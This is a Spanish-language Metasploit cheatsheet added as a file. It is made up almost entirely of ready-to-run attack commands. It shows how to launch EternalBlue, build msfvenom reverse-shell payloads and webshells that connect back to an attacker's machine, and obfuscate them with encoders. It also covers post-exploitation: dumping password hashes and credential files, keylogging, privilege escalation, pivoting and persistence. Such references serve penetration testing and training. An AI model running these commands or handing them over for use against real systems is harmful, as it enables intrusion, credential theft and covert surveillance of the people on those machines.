@@ -1,0 +1,175 @@
+================================================================================
+                        METASPLOIT - CHEATSHEET
+			Autor: D1n0
+================================================================================
+
+--- ARRANCAR ---
+
+# Iniciar base de datos y consola
+service postgresql start
+msfdb init
+msfconsole
+
+# Arranque rápido sin banner
+msfconsole -q
+
+
+--- BÚSQUEDA DE MÓDULOS ---
+
+# Buscar por nombre/CVE/tipo
+search eternalblue
+search type:exploit platform:windows smb
+search cve:2021-44228
+
+# Ver info de un módulo
+info exploit/windows/smb/ms17_010_eternalblue
+
+
+--- USAR UN MÓDULO ---
+
+use exploit/windows/smb/ms17_010_eternalblue
+show options                    # Ver parámetros requeridos
+set RHOSTS 192.168.1.10
+set LHOST 192.168.1.ATACANTE
+set LPORT 4444
+run                             # o: exploit
+
+
+--- OPCIONES COMUNES ---
+
+set RHOSTS 192.168.1.10         # Target IP
+set RPORT 445                   # Target port
+set LHOST 192.168.1.ATACANTE    # Tu IP (para reverse shells)
+set LPORT 4444                  # Tu puerto listener
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set THREADS 10
+
+
+--- PAYLOADS ---
+
+# Ver payloads compatibles con el módulo actual
+show payloads
+
+# Payloads más usados
+windows/x64/meterpreter/reverse_tcp
+windows/meterpreter/reverse_tcp
+linux/x86/meterpreter/reverse_tcp
+linux/x64/shell/reverse_tcp
+php/meterpreter/reverse_tcp
+python/meterpreter/reverse_tcp
+
+
+--- MSFVENOM (generar payloads standalone) ---
+
+# Windows EXE reverse shell
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.X LPORT=4444 -f exe -o shell.exe
+
+# Linux ELF
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.X LPORT=4444 -f elf -o shell.elf
+
+# PHP webshell
+msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.X LPORT=4444 -f raw -o shell.php
+
+# Python
+msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.X LPORT=4444 -f raw -o shell.py
+
+# JSP (para Tomcat)
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.X LPORT=4444 -f war -o shell.war
+
+# Ver formatos disponibles
+msfvenom --list formats
+
+# Encoders (ofuscación básica)
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=X LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o shell_encoded.exe
+
+
+--- MULTI/HANDLER (listener genérico) ---
+
+use exploit/multi/handler
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.1.ATACANTE
+set LPORT 4444
+set ExitOnSession false         # No cerrar al recibir sesión
+run -j                          # Correr en background
+
+
+--- METERPRETER - COMANDOS BÁSICOS ---
+
+# Info del sistema
+sysinfo
+getuid
+getpid
+
+# Navegación
+pwd
+ls
+cd C:\\Users
+
+# Subir/bajar ficheros
+upload /ruta/local/archivo.exe C:\\Users\\Public\\archivo.exe
+download C:\\Users\\Admin\\passwords.txt /tmp/
+
+# Shell del sistema
+shell                           # Abre cmd/bash nativo
+Ctrl+Z                          # Volver a meterpreter
+
+# Escalada de privilegios
+getsystem                       # Intenta escalar automáticamente
+getuid                          # Verificar si somos SYSTEM
+
+# Dump de credenciales
+hashdump                        # Hashes SAM (requiere SYSTEM)
+run post/windows/gather/credentials/credential_collector
+
+# Captura de pantalla y keylogger
+screenshot
+keyscan_start
+keyscan_dump
+keyscan_stop
+
+# Pivoting
+run autoroute -s 10.10.10.0/24  # Añadir ruta a red interna
+portfwd add -l 8080 -p 80 -r 10.10.10.5   # Port forwarding
+
+# Background / sesiones
+background                      # Mandar sesión a fondo
+sessions -l                     # Listar sesiones
+sessions -i 1                   # Volver a sesión 1
+sessions -k 1                   # Matar sesión 1
+
+
+--- POST-EXPLOTACIÓN MÓDULOS ---
+
+# Enumeración Windows
+use post/windows/gather/enum_system
+use post/windows/gather/enum_applications
+use post/windows/gather/checkvm
+
+# Enumeración Linux
+use post/linux/gather/enum_system
+use post/linux/gather/hashdump
+
+# Persistencia
+use post/windows/manage/persistence_exe
+
+
+--- BASE DE DATOS (workspace) ---
+
+workspace                       # Ver workspaces
+workspace -a nombre_proyecto    # Crear workspace
+workspace nombre_proyecto       # Cambiar a workspace
+
+db_nmap -sV 192.168.1.10        # Nmap directo a la DB
+hosts                           # Ver hosts descubiertos
+services                        # Ver servicios
+vulns                           # Ver vulnerabilidades encontradas
+
+
+--- TIPS ---
+
+# Tab completion funciona en todo
+# "back" para salir del módulo actual
+# "previous" para volver al módulo anterior
+# "grep" funciona: grep meterpreter show payloads
+
+================================================================================
